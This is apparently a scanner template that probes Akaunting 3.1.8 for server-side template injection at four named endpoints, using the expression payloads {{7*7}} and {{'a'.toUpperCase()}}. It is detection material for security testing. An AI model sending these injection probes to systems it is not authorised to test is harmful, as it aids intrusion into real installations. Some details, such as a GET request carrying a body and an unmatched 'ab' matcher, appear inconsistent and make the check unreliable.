id: akaunting-ssti
info:
  author: hexa
  description: This template detects Server-Side Template Injection (SSTI) in Akaunting
    version 3.1.8 through multiple endpoints.
  name: Akaunting 3.1.8 Server-Side Template Injection
  severity: high
requests:
- body: 'name={{7*7}}

    sale_price=100

    purchase_price=100

    '
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - type: word
    words:
    - '49'
  method: GET
  path:
  - '{{BaseURL}}/Akaunting/1/common/items'
  - '{{BaseURL}}/Akaunting/1/settings/taxes/1/edit'
  - '{{BaseURL}}/Akaunting/1/banking/transactions/create?type=income'
  - '{{BaseURL}}/Akaunting/1/purchases/vendors/1/edit'
- body: 'name={{7*7}}

    sale_price=100

    purchase_price=100

    description={{''a''.toUpperCase()}}

    '
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - type: word
    words:
    - '49'
    - A
    - ab
  method: POST
  path:
  - '{{BaseURL}}/Akaunting/1/common/items'
  - '{{BaseURL}}/Akaunting/1/settings/taxes/1/edit'
  - '{{BaseURL}}/Akaunting/1/banking/transactions/create?type=income'
  - '{{BaseURL}}/Akaunting/1/purchases/vendors/1/edit'
